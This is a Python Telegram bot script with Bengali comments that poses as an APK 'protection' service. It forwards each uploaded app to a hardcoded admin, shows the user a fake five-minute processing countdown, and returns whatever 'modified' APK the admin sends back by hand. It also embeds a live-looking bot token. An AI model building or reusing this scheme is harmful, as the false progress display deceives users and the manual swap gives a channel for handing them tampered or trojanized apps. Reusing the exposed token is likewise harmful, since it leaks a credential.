import telebot
import random
import time
from threading import Thread
from flask import Flask
import os

# আপনার নতুন টোকেন ও আইডি
TOKEN = '8709397620:AAEgvEbgxcbDQ3p0jIYYUyeHRRHNSjBfHrY'
ADMIN = 8049927326

bot = telebot.TeleBot(TOKEN)
active_sessions = {} # {user_id: timer_message_id}

# Render Server সচল রাখার জন্য
app = Flask('')
@app.route('/')
def home(): return "Bot is Online"

def run_flask():
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port)

# সেকেন্ডে সেকেন্ডে কাউন্টডাউন ফাংশন
def countdown(chat_id, msg_id, sub_id):
    total_seconds = 300 
    while total_seconds > 0:
        # যদি অ্যাডমিন ফাইল পাঠিয়ে দেয়, তবে লুপ বন্ধ হবে
        if chat_id not in active_sessions or active_sessions[chat_id] != msg_id:
            return 
        
        mins, secs = divmod(total_seconds, 60)
        time_format = '{:02d}:{:02d}'.format(mins, secs)
        
        try:
            bot.edit_message_text(
                f"Your apk is being processed...\n\n⌛ Estimated time left: {time_format}\n🆔 Submission ID: {sub_id}",
                chat_id, msg_id
            )
        except:
            break
        
        time.sleep(1)
        total_seconds -= 1

@bot.message_handler(commands=['start'])
def start(m): 
    bot.reply_to(m, "👋 Welcome! Send your APK to protect it.")

@bot.message_handler(content_types=['document'])
def handle_apk(message):
    global active_sessions
    
    if not message.document.file_name.endswith('.apk'):
        return

    # ১. অ্যাডমিন (আপনি) যখন মডিফাইড অ্যাপ পাঠাবেন
    if message.chat.id == ADMIN:
        target_user_id = next(iter(active_sessions), None)
        
        if target_user_id:
            # শুধু টাইমার মেসেজটি রিমুভ (Delete) করা হবে
            try:
                bot.delete_message(target_user_id, active_sessions[target_user_id])
            except:
                pass
            
            # ইউজারকে নতুন ফাইল পাঠানো
            bot.send_document(target_user_id, message.document.file_id, caption="✅ Your APK has been processed! Here it is.")
            bot.reply_to(message, f"✅ সফল! টাইমার রিমুভ করা হয়েছে এবং ফাইল পাঠানো হয়েছে।")
            
            # সেশন ক্লিয়ার
            del active_sessions[target_user_id]
        else:
            bot.reply_to(message, "❌ কোনো রিকোয়েস্ট পেন্ডিং নেই।")
        return

    # ২. সাধারণ ইউজার যখন অ্যাপ পাঠাবে
    user_id = message.chat.id
    sid = random.randint(100000, 999999)
    
    # অ্যাডমিনকে ফাইল পাঠানো
    bot.send_document(ADMIN, message.document.file_id, caption=f"📁 New APK!\nFrom: {message.from_user.first_name}\nID: {user_id}")
    
    # এখানে ইউজারের পাঠানো মেসেজ ডিলিট করার কোড সরিয়ে দিয়েছি (অ্যাপ ডিলিট হবে না)
    
    # টাইমার মেসেজ পাঠানো
    sent_msg = bot.send_message(user_id, f"Your apk has been queued.\n\n⌛ Estimated time left: 05:00\n🆔 Submission ID: {sid}")
    
    # মেসেজ আইডি সেভ করা যাতে পরে ডিলিট করা যায়
    active_sessions[user_id] = sent_msg.message_id
    
    # কাউন্টডাউন শুরু
    Thread(target=countdown, args=(user_id, sent_msg.message_id, sid)).start()

if __name__ == "__main__":
    Thread(target=run_flask).start()
    bot.infinity_polling()
